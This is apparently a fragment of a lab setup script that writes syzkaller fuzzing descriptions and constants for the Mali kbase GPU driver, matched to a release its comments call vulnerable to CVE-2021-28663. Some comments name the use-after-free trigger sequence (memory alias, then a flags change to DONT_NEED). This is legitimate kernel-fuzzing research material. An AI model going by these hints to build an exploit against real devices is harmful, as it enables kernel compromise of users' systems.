  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r36p0_csf.txt.const")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r36p0_csf.txt.const" <<'__PL_11__'
# Code generated by syz-sysgen. DO NOT EDIT.
arches = amd64, arm64
AT_FDCWD = 18446744073709551516
BASEP_MEM_INVALID_HANDLE = 0
BASEP_MEM_NO_USER_FREE = 128
BASEP_MEM_PERMANENT_KERNEL_MAPPING = 32
BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE = 16384
BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED = 2
BASE_MEM_CACHED_CPU = 4096
BASE_MEM_COHERENT_LOCAL = 2048
BASE_MEM_COHERENT_SYSTEM = 1024
BASE_MEM_COHERENT_SYSTEM_REQUIRED = 32768
BASE_MEM_CSF_EVENT = 524288
BASE_MEM_DONT_NEED = 131072
BASE_MEM_FIXED = 256
BASE_MEM_GPU_VA_SAME_4GB_PAGE = 64
BASE_MEM_GROW_ON_GPF = 512
BASE_MEM_IMPORT_SHARED = 262144
BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP = 67108864
BASE_MEM_IMPORT_TYPE_INVALID = 0
BASE_MEM_IMPORT_TYPE_UMM = 2
BASE_MEM_IMPORT_TYPE_USER_BUFFER = 3
BASE_MEM_NEED_MMAP = 16384
BASE_MEM_PROTECTED = 65536
BASE_MEM_PROT_CPU_RD = 1
BASE_MEM_PROT_CPU_WR = 2
BASE_MEM_PROT_GPU_EX = 16
BASE_MEM_PROT_GPU_RD = 4
BASE_MEM_PROT_GPU_WR = 8
BASE_MEM_RESERVED_BIT_20 = 1048576
BASE_MEM_SAME_VA = 8192
BASE_MEM_UNCACHED_GPU = 2097152
BASE_SYNCSET_OP_CSYNC = 2
BASE_SYNCSET_OP_MSYNC = 1
BASE_TIMEINFO_CYCLE_COUNTER_FLAG = 4
BASE_TIMEINFO_KERNEL_SOURCE_FLAG = 1073741824
BASE_TIMEINFO_MONOTONIC_FLAG = 1
BASE_TIMEINFO_TIMESTAMP_FLAG = 2
BASE_TIMEINFO_USER_SOURCE_FLAG = 2147483648
KBASE_HWCNT_READER_CLEAR = 1074052625
KBASE_HWCNT_READER_DISABLE_EVENT = 1074052673
KBASE_HWCNT_READER_DUMP = 1074052624
KBASE_HWCNT_READER_ENABLE_EVENT = 1074052672
KBASE_HWCNT_READER_GET_API_VERSION = 1074052863
KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES = 1074315007
KBASE_HWCNT_READER_GET_BUFFER = 2148580896
KBASE_HWCNT_READER_GET_BUFFER_SIZE = 2147794433
KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES = 2149629472
KBASE_HWCNT_READER_GET_HWVER = 2147794432
KBASE_HWCNT_READER_PUT_BUFFER = 1074839073
KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES = 1075887649
KBASE_HWCNT_READER_SET_INTERVAL = 1074052656
KBASE_IOCTL_CONTEXT_PRIORITY_CHECK = 3221323830
KBASE_IOCTL_CS_CPU_QUEUE_DUMP = 1074823221
KBASE_IOCTL_CS_EVENT_SIGNAL = 32812
KBASE_IOCTL_CS_GET_GLB_IFACE = 3222831155
KBASE_IOCTL_CS_QUEUE_BIND = 3222306855
KBASE_IOCTL_CS_QUEUE_GROUP_CREATE = 3223879738
KBASE_IOCTL_CS_QUEUE_GROUP_CREATE_1_6 = 3223355434
KBASE_IOCTL_CS_QUEUE_GROUP_TERMINATE = 1074298923
KBASE_IOCTL_CS_QUEUE_KICK = 1074298917
KBASE_IOCTL_CS_QUEUE_REGISTER = 1074823204
KBASE_IOCTL_CS_QUEUE_REGISTER_EX = 1076396072
KBASE_IOCTL_CS_QUEUE_TERMINATE = 1074298921
KBASE_IOCTL_CS_TILER_HEAP_INIT = 3222306864
KBASE_IOCTL_CS_TILER_HEAP_TERM = 1074298929
KBASE_IOCTL_DISJOINT_QUERY = 2147778572
KBASE_IOCTL_FENCE_VALIDATE = 1074036761
KBASE_IOCTL_GET_CONTEXT_ID = 2147778577
KBASE_IOCTL_GET_CPU_GPU_TIMEINFO = 3223355442
KBASE_IOCTL_GET_DDK_VERSION = 1074823181
KBASE_IOCTL_GET_GPUPROPS = 1074823171
KBASE_IOCTL_HWCNT_READER_SETUP = 1075085320
KBASE_IOCTL_HWCNT_SET = 1074823200
KBASE_IOCTL_KCPU_QUEUE_CREATE = 2148040749
KBASE_IOCTL_KCPU_QUEUE_DELETE = 1074298926
KBASE_IOCTL_KCPU_QUEUE_ENQUEUE = 1074823215
KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO = 3222306872
KBASE_IOCTL_KINSTR_PRFCNT_SETUP = 3222306873
KBASE_IOCTL_MEM_ALIAS = 3223355413
KBASE_IOCTL_MEM_ALLOC = 3223355397
KBASE_IOCTL_MEM_ALLOC_EX = 3225452603
KBASE_IOCTL_MEM_COMMIT = 1074823188
KBASE_IOCTL_MEM_EXEC_INIT = 1074298918
KBASE_IOCTL_MEM_FIND_CPU_OFFSET = 3222831120
KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET = 3222306847
KBASE_IOCTL_MEM_FLAGS_CHANGE = 1075347479
KBASE_IOCTL_MEM_FREE = 1074298887
KBASE_IOCTL_MEM_IMPORT = 3222831126
KBASE_IOCTL_MEM_JIT_INIT = 1075347470
KBASE_IOCTL_MEM_JIT_INIT_10_2 = 1074298894
KBASE_IOCTL_MEM_JIT_INIT_11_5 = 1074823182
KBASE_IOCTL_MEM_PROFILE_ADD = 1074823195
KBASE_IOCTL_MEM_QUERY = 3222306822
KBASE_IOCTL_MEM_SYNC = 1075871759
KBASE_IOCTL_SET_FLAGS = 1074036737
KBASE_IOCTL_SET_LIMITED_CORE_COUNT = 1073840183
KBASE_IOCTL_STICKY_RESOURCE_MAP = 1074823197
KBASE_IOCTL_STICKY_RESOURCE_UNMAP = 1074823198
KBASE_IOCTL_STREAM_CREATE = 1075871768
KBASE_IOCTL_TLSTREAM_ACQUIRE = 1074036754
KBASE_IOCTL_TLSTREAM_FLUSH = 32787
KBASE_IOCTL_VERSION_CHECK = 3221520436
KBASE_IOCTL_VERSION_CHECK_RESERVED = 3221520384
KBASE_MEM_QUERY_COMMIT_SIZE = 1
KBASE_MEM_QUERY_FLAGS = 3
KBASE_MEM_QUERY_VA_SIZE = 2
__NR_ioctl = amd64:16, arm64:29
__NR_mmap = amd64:9, arm64:222
__NR_munmap = amd64:11, arm64:215
__NR_openat = amd64:257, arm64:56
__PL_11__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r36p0_csf.txt.const" "04c70d66201260cfe6a0150e3a0ffd18b8b71f6bdfd9f62df1b64f7eb1e88996"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r28p0.txt")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r28p0.txt" <<'__PL_12__'
# syzkaller syscall descriptions for the Mali "kbase" UAPI.
#
# RELEASE-MATCHED to: r28p0-01eac0 (UAPI UK 11.29, PRE the CVE-2021-28663
# fix — this is the VULNERABLE release of the lab's UAF vehicle), JOB
# MANAGER mode (MALI_USE_CSF == 0) exactly as built into this lab's 4.19.320
# NO_MALI kernel (builds/linux-4.19.320-r41p0, banner r28p0-01eac0).
#
# Provenance & verification (full detail in evidence/07_uapi_diff.md and
# evidence/11_fuzz_r28p0.md):
# - Derived from the lab's r41p0-01eac0 description (evidence/06) by applying
#   the release-delta computed field-by-field against THIS release's pristine
#   uapi headers under harness/release_uapi/r28p0 (hashes in MANIFEST.md).
#   Struct layouts are identical between r28p0 and r41p0 for every modeled
#   struct (verified by diff; only u64/__u64 spelling differs) EXCEPT the
#   ioctl-surface delta below.
# - ADDED (r28p0-only ioctls, removed by UK 11.33/11.36):
#   KBASE_IOCTL_HWCNT_ENABLE(9) / HWCNT_DUMP(10) / HWCNT_CLEAR(11) — legacy
#   in-kernel hwcnt, dump_buffer is a raw GPU address; and the size-encoded
#   JIT-init family on the SAME nr 14: MEM_JIT_INIT_10_2 (8B), MEM_JIT_INIT_11_5
#   (16B), alongside the 24B MEM_JIT_INIT (all three are _IOW type 0x80 nr 14,
#   distinguished by _IOC_SIZE — same modeling pattern Phase E used for the
#   hwcnt buffer ioctls).
# - REMOVED (r29p0/r41p0-era additions absent here): KINSTR_JM_FD(51),
#   KINSTR_PRFCNT_SETUP(53), CONTEXT_PRIORITY_CHECK(54),
#   KINSTR_PRFCNT_ENUM_INFO(56), SET_LIMITED_CORE_COUNT(55).
# - Excluded as unreachable in THIS kernel config (documented, not silently):
#   CINSTR_GWT_* (CONFIG_MALI_CINSTR_GWT unset), TLSTREAM_STATS/EXTRA_TYPE/
#   MY_IOCTL/TEST_TYPE incl. TLSTREAM_TEST (MALI_UNIT_TEST only; TLSTREAM_TEST
#   additionally uses a different ioctl TYPE), CS_* queue/fault ioctls +
#   MEM_ALLOC_EX + READ_USER_PAGE (MALI_USE_CSF), GET_PROFILING_CONTROLS
#   (already removed by this release — jm header changelog says so).
#
# Union-style ioctl structs: kbase passes in/out views of one buffer. Fields
# that alias the kernel's out-view slot are typed as the out value and marked
# (inout), e.g. MEM_ALLOC@8 = commit_pages(in)/gpu_va(out); the executor then
# copyouts the kernel-returned GPU VA into the gpu_addr resource, enabling
# alloc -> use -> free chaining while keeping the modeled size == the exact
# release _IOC_SIZE.
#
# Consts in dev_mali_r28p0.txt.const were extracted from the r28p0 headers:
#   bin/syz-extract -arch amd64 -sourcedir/-builddir builds/linux-4.19.320-r41p0 \
#       -includedirs harness/release_uapi/r28p0 dev_mali_r28p0.txt
# and cross-checked against a C dumper compiled from the same headers.
# Keep this file `meta noextract` so `make extract` cannot clobber the
# release-matched consts with values from an unrelated kernel tree.
meta noextract


include <gpu/arm/midgard/mali_base_kernel.h>
include <gpu/arm/midgard/jm/mali_base_jm_kernel.h>
include <gpu/arm/midgard/jm/mali_kbase_jm_ioctl.h>
include <gpu/arm/midgard/mali_kbase_ioctl.h>
include <gpu/arm/midgard/mali_kbase_hwcnt_reader.h>
include <uapi/linux/fcntl.h>
include <linux/types.h>

resource fd_bifrost[fd]
resource gpu_addr[int64]: BASEP_MEM_INVALID_HANDLE, BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE
resource user_addr[int64]: -1
resource fd_fence[fd]
resource fd_hwcnt[fd]

openat$bifrost(fd const[AT_FDCWD], file ptr[in, string["/dev/bifrost"]], flags flags[open_flags], mode const[0]) fd_bifrost
# Our NO_MALI build registers miscdevice mali0 -> /dev/mali0
openat$mali(fd const[AT_FDCWD], file ptr[in, string["/dev/mali0"]], flags flags[open_flags], mode const[0]) fd_bifrost

# GPU VA mmap: kbase's vm_pgoff encodes the region cookie (Phase F3 smoke:
# mmap(offset=cookie bytes) materializes the SAME_VA region).
mmap$bifrost(addr const[0], len len[addr], prot flags[mmap_prot], flags flags[mmap_flags], fd fd_bifrost, offset fileoff) user_addr
munmap$bifrost(addr user_addr, len intptr)

ioctl$KBASE_IOCTL_JOB_SUBMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_JOB_SUBMIT], arg ptr[in, kbase_ioctl_job_submit])
ioctl$KBASE_IOCTL_POST_TERM(fd fd_bifrost, cmd const[KBASE_IOCTL_POST_TERM], arg const[0])
ioctl$KBASE_IOCTL_SOFT_EVENT_UPDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_SOFT_EVENT_UPDATE], arg ptr[in, kbase_ioctl_soft_event_update])
ioctl$KBASE_IOCTL_VERSION_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_VERSION_CHECK_RESERVED(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK_RESERVED], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_SET_FLAGS(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_FLAGS], arg ptr[in, kbase_ioctl_set_flags])
ioctl$KBASE_IOCTL_GET_GPUPROPS(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_GPUPROPS], arg ptr[inout, kbase_ioctl_get_gpuprops])
ioctl$KBASE_IOCTL_MEM_ALLOC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALLOC], arg ptr[inout, kbase_ioctl_mem_alloc])
# in-view only: out.value aliases the gpu_addr@0 slot; observing it would
# poison the gpu_addr resource with non-address query values.
ioctl$KBASE_IOCTL_MEM_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_QUERY], arg ptr[in, kbase_ioctl_mem_query])
ioctl$KBASE_IOCTL_MEM_FREE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FREE], arg ptr[in, kbase_ioctl_mem_free])
ioctl$KBASE_IOCTL_HWCNT_READER_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_READER_SETUP], arg ptr[in, kbase_ioctl_hwcnt_reader_setup]) fd_hwcnt
ioctl$KBASE_IOCTL_HWCNT_SET(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_SET], arg ptr[inout, kbase_ioctl_hwcnt_values])
# r28p0-only legacy in-kernel hwcnt (removed UK 11.33): ENABLE carries a raw
# GPU dump address; DUMP/CLEAR are _IO (no arg).
ioctl$KBASE_IOCTL_HWCNT_ENABLE(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_ENABLE], arg ptr[in, kbase_ioctl_hwcnt_enable])
ioctl$KBASE_IOCTL_HWCNT_DUMP(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_DUMP], arg const[0])
ioctl$KBASE_IOCTL_HWCNT_CLEAR(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_CLEAR], arg const[0])
ioctl$KBASE_IOCTL_DISJOINT_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_DISJOINT_QUERY], arg ptr[out, kbase_ioctl_disjoint_query])
ioctl$KBASE_IOCTL_GET_DDK_VERSION(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_DDK_VERSION], arg ptr[inout, kbase_ioctl_get_ddk_version])
# THREE size-encoded variants share nr 14 in r28p0: 8B (10.2), 16B (11.5), 24B (current).
ioctl$KBASE_IOCTL_MEM_JIT_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT], arg ptr[in, kbase_ioctl_mem_jit_init])
ioctl$KBASE_IOCTL_MEM_JIT_INIT_10_2(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT_10_2], arg ptr[in, kbase_ioctl_mem_jit_init_10_2])
ioctl$KBASE_IOCTL_MEM_JIT_INIT_11_5(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT_11_5], arg ptr[in, kbase_ioctl_mem_jit_init_11_5])
ioctl$KBASE_IOCTL_MEM_EXEC_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_EXEC_INIT], arg ptr[in, kbase_ioctl_mem_exec_init])
ioctl$KBASE_IOCTL_MEM_SYNC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_SYNC], arg ptr[in, kbase_ioctl_mem_sync])
# in-view only: out.offset aliases gpu_addr@0 (not an address).
ioctl$KBASE_IOCTL_MEM_FIND_CPU_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_CPU_OFFSET], arg ptr[in, kbase_ioctl_mem_find_cpu_offset])
ioctl$KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET], arg ptr[inout, kbase_ioctl_mem_find_gpu_start_and_offset])
ioctl$KBASE_IOCTL_GET_CONTEXT_ID(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CONTEXT_ID], arg ptr[out, kbase_ioctl_get_context_id])
ioctl$KBASE_IOCTL_TLSTREAM_ACQUIRE(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_ACQUIRE], arg ptr[in, kbase_ioctl_tlstream_acquire])
ioctl$KBASE_IOCTL_TLSTREAM_FLUSH(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_FLUSH], arg const[0])
ioctl$KBASE_IOCTL_MEM_COMMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_COMMIT], arg ptr[in, kbase_ioctl_mem_commit])
ioctl$KBASE_IOCTL_MEM_ALIAS(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALIAS], arg ptr[inout, kbase_ioctl_mem_alias])
ioctl$KBASE_IOCTL_MEM_IMPORT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_IMPORT], arg ptr[inout, kbase_ioctl_mem_import])
ioctl$KBASE_IOCTL_MEM_FLAGS_CHANGE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FLAGS_CHANGE], arg ptr[in, kbase_ioctl_mem_flags_change])
ioctl$KBASE_IOCTL_STREAM_CREATE(fd fd_bifrost, cmd const[KBASE_IOCTL_STREAM_CREATE], arg ptr[in, kbase_ioctl_stream_create]) fd_fence
ioctl$KBASE_IOCTL_FENCE_VALIDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_FENCE_VALIDATE], arg ptr[in, kbase_ioctl_fence_validate])
ioctl$KBASE_IOCTL_MEM_PROFILE_ADD(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_PROFILE_ADD], arg ptr[in, kbase_ioctl_mem_profile_add])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_MAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_MAP], arg ptr[in, kbase_ioctl_sticky_resource_map])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_UNMAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_UNMAP], arg ptr[in, kbase_ioctl_sticky_resource_unmap])
# in-view only (32B): out view aliases the request_flags/paddings slots.
ioctl$KBASE_IOCTL_GET_CPU_GPU_TIMEINFO(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CPU_GPU_TIMEINFO], arg ptr[in, kbase_ioctl_get_cpu_gpu_timeinfo])

# hwcnt reader fd (returned by HWCNT_READER_SETUP) — mali_kbase_hwcnt_reader.h.
ioctl$KBASE_HWCNT_READER_GET_HWVER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_HWVER], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_SIZE(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_SIZE], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_DUMP(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DUMP], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_CLEAR(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_CLEAR], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER], arg ptr[out, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES], arg ptr[out, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER], arg ptr[in, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES], arg ptr[in, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_SET_INTERVAL(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_SET_INTERVAL], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_ENABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_ENABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_DISABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DISABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_API_VERSION(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION], arg ptr[in, int32])
# same nr 0xFF, size-encoded newer variant (release drift axis)
ioctl$KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES], arg ptr[in, kbase_hwcnt_reader_api_version])

type base_atom_id int8

base_jd_udata {
	blob	array[int64, 2]
}

base_dependency {
	atom_id			base_atom_id
	dependency_type	flags[base_jd_dep_type, int8]
}

base_jd_atom_v2 {
	jc			int64
	udata			base_jd_udata
	extres_list		int64
	nr_extres		int16
	jit_id			array[int8, 2]
	pre_dep			array[base_dependency, 2]
	atom_number		base_atom_id
	prio			flags[base_jd_prio, int8]
	device_nr		int8
	jobslot			int8
	core_req		flags[base_jd_core_req, int32]
	renderpass_id	int8
	padding			array[const[0, int8], 7]
}

kbase_ioctl_job_submit {
	addr		ptr64[in, array[base_jd_atom_v2]]
	nr_atoms	len[addr, int32]
# sizeof(base_jd_atom_v2)
	stride		const[56, int32]
}

kbase_ioctl_version_check {
	major	int16
	minor	int16
}

kbase_ioctl_set_flags {
	create_flags	flags[basep_context_create_kernel_flags, int32]
}

kbase_ioctl_get_gpuprops {
	buffer	ptr64[out, array[int8]]
	size	len[buffer, int32]
	flags	const[0, int32]
}

kbase_ioctl_mem_alloc {
# C union (32B): in {va_pages, commit_pages, extension, flags};
# out {flags@0, gpu_va@8}. Modeled per upstream dev_bifrost.txt: in-view
# fields carry the request; @0 is the out view (out_overlay) and @8 copyouts
# the returned cookie VA into gpu_addr -- a NON-consuming producer, so the
# gpu_addr chain (alloc -> alias/flags_change -> free) stays live (an
# (inout) modeling makes every consumer also the only producer, which
# syzkaller resolves by disabling all of them).
	va_pages	int64
	commit_pages	int64
	extent		int64
	flags		flags[base_mem_alloc_flags, int64]
	out_flags	int64	(out_overlay)
	gpu_va		gpu_addr
}

kbase_ioctl_mem_query {
	gpu_addr	gpu_addr
	query		flags[kbase_ioctl_mem_query_flags, int64]
}

kbase_ioctl_mem_free {
	gpu_addr	gpu_addr
}

kbase_ioctl_hwcnt_reader_setup {
	buffer_count	int32
	fe_bm			int32
	shader_bm		int32
	tiler_bm		int32
	mmu_l2_bm		int32
}

kbase_ioctl_hwcnt_values {
	data	ptr64[out, array[int8]]
	size	len[data, int32]
	padding	const[0, int32]
}

# r28p0-only legacy hwcnt enable (24B): dump_buffer is a raw GPU address the
# MMU writes counter values to (int64, not a managed kbase region handle).
kbase_ioctl_hwcnt_enable {
	dump_buffer	int64
	fe_bm		int32
	shader_bm	int32
	tiler_bm	int32
	mmu_l2_bm	int32
}

kbase_ioctl_disjoint_query {
	counter	int32
}

kbase_ioctl_get_ddk_version {
	version_buffer	ptr64[out, array[int8]]
	size			len[version_buffer, int32]
	padding			const[0, int32]
}

kbase_ioctl_mem_jit_init {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
	phys_pages		int64
}

kbase_ioctl_mem_jit_init_10_2 {
	va_pages	int64
}

kbase_ioctl_mem_jit_init_11_5 {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
}

kbase_ioctl_mem_exec_init {
	va_pages	int64
}

kbase_ioctl_mem_sync {
	handle		gpu_addr
	user_addr	user_addr
	size		int64
	type		flags[base_syncset_op_flags, int8]
	padding		array[const[0, int8], 7]
}

kbase_ioctl_mem_find_cpu_offset {
	gpu_addr	gpu_addr
	cpu_addr	user_addr
	size		int64
}

kbase_ioctl_mem_find_gpu_start_and_offset {
# union (16B): in {gpu_addr, size}; out {start@0, offset@8}. Slot@0 is both
# the in-view gpu_addr and the out-view start (a live region base): consumes
# gpu_addr as input, copyouts start back into gpu_addr for chaining. The
# overlay is declared on the size field (must not be on the first field); the
# compiler lays the two views out independently so both stay 16B.
	gpu_addr	gpu_addr
	size		int64
	start		gpu_addr	(out_overlay)
	offset		int64
}

kbase_ioctl_get_context_id {
	id	int32
}

kbase_ioctl_tlstream_acquire {
	flags	int32
}

kbase_ioctl_mem_commit {
	gpu_addr	gpu_addr
	pages		int64
}

kbase_ioctl_mem_alias {
# union (32B): in {flags, stride, nents, aliasing_info};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
# NOTE (CVE-2021-28663 vehicle): MEM_ALIAS + MEM_FLAGS_CHANGE(DONT_NEED) is
# the vulnerable lifetime sequence on THIS release — see evidence/09.
# NOTE: kbase_mem_alias computes num_pages = nents * stride, i.e. stride is
# consumed as PAGES despite the header comment saying bytes (verified
# empirically in evidence/09 §2 — byte strides make the alias mmap fail).
	flags		flags[base_mem_alloc_flags, int64]
	stride		int64
	nents		len[aliasing_info, int64]
	aliasing_info	ptr64[in, array[base_mem_aliasing_info]]
	out_flags	int64	(out_overlay)
	out_gpu_va	gpu_addr
	out_va_pages	int64
}

base_mem_aliasing_info {
	handle	gpu_addr
	offset	int64
	length	int64
}

kbase_ioctl_mem_import {
# union (24B): in {flags, phandle, type, padding}; out {flags@0, gpu_va@8,
# va_pages@16}. Same layout as MEM_ALIAS: @8 is the in-view phandle and the
# out-view gpu_va (out_overlay), so the returned VA copyouts into gpu_addr
# as a non-consuming producer.
	flags		flags[base_mem_alloc_flags, int64]
	phandle		gpu_addr
	type		flags[base_mem_import_type, int32]
	padding		const[0, int32]
	out_flags	int64	(out_overlay)
	out_gpu_va	gpu_addr
	out_va_pages	int64
}

kbase_ioctl_mem_flags_change {
	gpu_va	gpu_addr
	flags	flags[base_mem_alloc_flags, int64]
	mask	int64
}

kbase_ioctl_stream_create {
	name	array[int8, 32]
}

kbase_ioctl_fence_validate {
	fd	fd_fence
}

kbase_ioctl_mem_profile_add {
	buffer	ptr64[in, array[int8]]
	len		len[buffer, int32]
	padding	const[0, int32]
}

kbase_ioctl_sticky_resource_map {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_sticky_resource_unmap {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_soft_event_update {
	event		gpu_addr
	new_status	int32
	flags		const[0, int32]
}

kbase_ioctl_get_cpu_gpu_timeinfo {
	request_flags	flags[base_timerequest_allowed_flags, int32]
	paddings		array[const[0, int8], 28]
}

# r28p0 has TWO generations of the buffer ioctls on the SAME nr (0x20/0x21),
# distinguished by _IOC_SIZE: legacy (offsetof-cycles = 16B) and *_WITH_CYCLES
# (32B full metadata). Model both, release-exact.
kbase_hwcnt_reader_metadata_legacy {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
}

kbase_hwcnt_reader_api_version {
	version	int32
	features int32
}

kbase_hwcnt_reader_metadata_cycles {
	top			int64
	shader_cores	int64
}

kbase_hwcnt_reader_metadata {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
	cycles		kbase_hwcnt_reader_metadata_cycles
}

base_jd_dep_type = BASE_JD_DEP_TYPE_INVALID, BASE_JD_DEP_TYPE_DATA, BASE_JD_DEP_TYPE_ORDER
base_jd_prio = BASE_JD_PRIO_MEDIUM, BASE_JD_PRIO_HIGH, BASE_JD_PRIO_LOW
base_jd_core_req = BASE_JD_REQ_DEP, BASE_JD_REQ_FS, BASE_JD_REQ_CS, BASE_JD_REQ_T, BASE_JD_REQ_CF, BASE_JD_REQ_V, BASE_JD_REQ_FS_AFBC, BASE_JD_REQ_EVENT_COALESCE, BASE_JD_REQ_COHERENT_GROUP, BASE_JD_REQ_PERMON, BASE_JD_REQ_EXTERNAL_RESOURCES, BASE_JD_REQ_SOFT_JOB, BASE_JD_REQ_ONLY_COMPUTE, BASE_JD_REQ_SPECIFIC_COHERENT_GROUP, BASE_JD_REQ_EVENT_ONLY_ON_FAILURE, BASE_JD_REQ_SKIP_CACHE_START, BASE_JD_REQ_SKIP_CACHE_END, BASE_JD_REQ_JOB_SLOT, BASE_JD_REQ_START_RENDERPASS, BASE_JD_REQ_END_RENDERPASS
kbase_ioctl_mem_query_flags = KBASE_MEM_QUERY_COMMIT_SIZE, KBASE_MEM_QUERY_VA_SIZE, KBASE_MEM_QUERY_FLAGS
base_syncset_op_flags = BASE_SYNCSET_OP_MSYNC, BASE_SYNCSET_OP_CSYNC
# all bits verified present in the r28p0 jm/base headers (evidence/11)
